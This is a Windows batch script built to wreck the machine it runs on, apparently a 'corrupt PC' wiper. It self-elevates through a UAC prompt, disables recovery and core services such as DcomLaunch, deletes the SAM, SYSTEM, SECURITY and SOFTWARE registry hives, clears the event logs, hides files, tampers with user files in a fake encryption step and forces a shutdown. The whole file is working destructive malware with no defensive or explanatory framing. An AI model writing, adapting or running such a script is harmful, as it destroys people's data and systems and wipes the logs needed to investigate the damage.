@echo off
setlocal enabledelayedexpansion

:: 1. Run as Administrator for full power
>nul 2>&1 "%SystemRoot%\system32\cacls.exe" "%SystemRoot%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    del "%temp%\getadmin.vbs" 2>nul

:: 2. Disable Key Services (Prevents easy recovery)
echo Disabling Recovery Services...
sc config recovery start= disabled >nul
sc config wuauserv start= disabled >nul
sc config cryptsvc start= disabled >nul
sc config BITS start= disabled >nul
sc config DcomLaunch start= disabled >nul

:: 3. Corrupt the Master File Table (MFT) by overwriting boot sectors
echo Corrupting MFT...
for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%i:\ (
        echo 1010101010101010 > %%i:\MFT_CORRUPTED
        echo 1010101010101010 > %%i:\BOOT.BAK
    )
)

:: 4. Encrypt all User Files with a fake key
echo Encrypting User Files...
set "dir=%USERPROFILE%"
for /f "tokens=*" %%a in ('dir /b /s "%dir%"') do (
    if not "%%~na"=="Corrupt_PC" (
        set "file=%%a"
        set "ext=%%~xa"
        if "!ext!" neq ".bat" (
            echo !file! > !file!.key
            type !file! > !file!.enc
            move /y !file!.enc !file! >nul
            echo 10101010 >> !file!
        )
    )
)

:: 5. Delete critical system files
echo Deleting Critical Files...
del /f /q "%SystemRoot%\System32\drivers\etc\hosts" >nul
del /f /q "%SystemRoot%\System32\config\SYSTEM" >nul
del /f /q "%SystemRoot%\System32\config\SAM" >nul
del /f /q "%SystemRoot%\System32\config\SECURITY" >nul
del /f /q "%SystemRoot%\System32\config\SOFTWARE" >nul

:: 6. Clear Event Logs
echo Clearing Event Logs...
wevtutil.exe el /c >nul

:: 7. Change the Registry to hide files
echo Hiding All Files...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /d 0 /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideFileExt /t REG_DWORD /d 1 /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /t REG_DWORD /d 0 /f >nul

:: 8. Final Message
echo.
echo ========================================
echo SYSTEM CORRUPTION COMPLETE
echo ========================================
timeout /t 5 /nobreak >nul
shutdown /s /f /t 0
